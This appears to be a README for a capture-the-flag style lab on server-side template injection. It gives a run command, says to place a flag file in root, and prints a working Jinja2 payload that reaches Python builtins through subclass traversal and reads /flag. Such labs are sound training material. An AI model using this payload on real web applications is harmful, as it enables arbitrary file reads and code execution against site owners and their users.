# SSTI

## How to run

```python main.py```

## Note [Important]
put a flag file in root.

## Exploit

```
{%for c in [].__class__.__base__.__subclasses__() %} {% if c.__name__=='catch_warnings' %} {{ c.__init__.__globals__['__builtins__'].open('/flag', 'r').read() }} {% endif %} {%endfor%}
```